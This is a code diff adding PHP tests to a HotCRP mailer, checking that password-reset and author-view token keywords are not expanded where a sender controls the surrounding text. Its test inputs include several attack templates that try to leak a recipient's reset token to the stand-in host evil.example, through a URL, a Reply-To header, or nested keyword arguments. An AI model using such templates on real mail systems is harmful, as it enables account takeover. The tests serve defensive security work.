@@ -125,6 +125,85 @@ class Mailer_Tester {
         MailChecker::clear();
     }
 
+    function test_author_view_capability_manager_only() {
+        $conf = $this->conf;
+        $pc = $conf->checked_user_by_email("jon@cs.ucl.ac.uk"); // PC, not a manager
+        $chair = $conf->checked_user_by_email("chair@_.com");
+        $author = $conf->checked_user_by_email("puneet@catarina.usc.edu"); // author of #1
+        xassert(!$pc->is_manager());
+
+        $prow = $conf->checked_paper_by_id(1);
+        xassert($prow->has_author($author));
+
+        $old_sharing = $conf->opt("authorSharing");
+        $conf->set_opt("authorSharing", 1); // let author-view links be minted
+
+        $rest = ["prow" => $prow, "width" => 10000];
+        // an administrator may put the author-view link in custom text
+        $cmailer = new HotCRPMailer($chair, $author, $rest);
+        xassert_str_contains($cmailer->expand("x={{AUTHORVIEWCAPABILITY}}", "body"), "cap=");
+
+        // a non-manager sender may not: the keyword is left unexpanded, so the
+        // sender cannot mint an author-view token in text they control
+        $pmailer = new HotCRPMailer($pc, $author, $rest);
+        $t = $pmailer->expand("x={{AUTHORVIEWCAPABILITY}}", "body");
+        xassert_not_str_contains($t, "cap=");
+        xassert_str_contains($t, "{{AUTHORVIEWCAPABILITY}}");
+
+        $conf->set_opt("authorSharing", $old_sharing);
+    }
+
+    function test_password_link_body_only_and_standalone() {
+        $conf = $this->conf;
+        xassert(!$conf->login_type()); // password sign-in, so the keyword is live
+        $recipient = $conf->checked_user_by_email("estrin@usc.edu");
+        $rest = ["no_error_quit" => true, "width" => 10000];
+
+        // a password link on its own line expands (HotCRP’s own templates do this)
+        $prep = HotCRPMailer::prepare_to($recipient, ["subject" => "S", "body" => "{{PASSWORDLINK}}"], $rest);
+        xassert_str_contains($prep->body, "resetpassword/hcpw");
+
+        // whitespace on both sides is also fine
+        $prep = HotCRPMailer::prepare_to($recipient, ["subject" => "S", "body" => "Reset here: {{PASSWORDLINK}}"], $rest);
+        xassert_str_contains($prep->body, "resetpassword/hcpw");
+
+        // glued into a sender-controlled URL: left unexpanded, no token delivered
+        $prep = HotCRPMailer::prepare_to($recipient, ["subject" => "S", "body" => "http://evil.example/p?r={{PASSWORDLINK}}"], $rest);
+        xassert_not_str_contains($prep->body, "hcpw");
+        xassert_str_contains($prep->body, "{{PASSWORDLINK}}");
+
+        // in a header (Reply-To), even on its own: left unexpanded (body only)
+        $prep = HotCRPMailer::prepare_to($recipient, ["subject" => "S", "body" => "hi", "reply-to" => "{{PASSWORDLINK}}"], $rest);
+        xassert_not_str_contains(json_encode($prep->headers), "hcpw");
+
+        // the Reply-To display-name trick: also unexpanded
+        $prep = HotCRPMailer::prepare_to($recipient, ["subject" => "S", "body" => "hi", "reply-to" => "\"{{PASSWORDLINK}}\" <evil@example.com>"], $rest);
+        xassert_not_str_contains(json_encode($prep->headers), "hcpw");
+
+        // a conditional wrapper is transparent: a standalone link inside an
+        // {{IF}} body still expands
+        $prep = HotCRPMailer::prepare_to($recipient, ["subject" => "S", "body" => "{{IF(CONFNAME)}}\n{{PASSWORDLINK}}\n{{ENDIF}}"], $rest);
+        xassert_str_contains($prep->body, "resetpassword/hcpw");
+
+        // but it cannot be smuggled through another keyword’s arguments, where
+        // its value would land in the string that keyword builds
+        $prep = HotCRPMailer::prepare_to($recipient, ["subject" => "S", "body" => "http://evil.example/p?r={{URLENC(PASSWORDLINK)}}"], $rest);
+        xassert_not_str_contains($prep->body, "hcpw");
+        $prep = HotCRPMailer::prepare_to($recipient, ["subject" => "S", "body" => "see {{LINK(resetpassword, {{PASSWORDLINK}})}}"], $rest);
+        xassert_not_str_contains($prep->body, "hcpw");
+
+        // the built-in templates that carry the link still expand it (each
+        // uses {{PASSWORDLINK}} as its own body line, so none is affected)
+        foreach (["@resetpassword", "@newaccount.selfregister"] as $tmpl) {
+            $prep = HotCRPMailer::prepare_to($recipient, $tmpl, $rest);
+            xassert_str_contains($prep->body, "resetpassword/hcpw");
+        }
+
+        // tidy up the reset tokens the standalone expansions minted
+        $conf->qe("delete from Capability where capabilityType=? and contactId=?",
+            TokenInfo::RESETPASSWORD, $recipient->contactId);
+    }
+
     function test_send() {
         MailChecker::clear();
         $user = $this->conf->checked_user_by_email("chair@_.com");
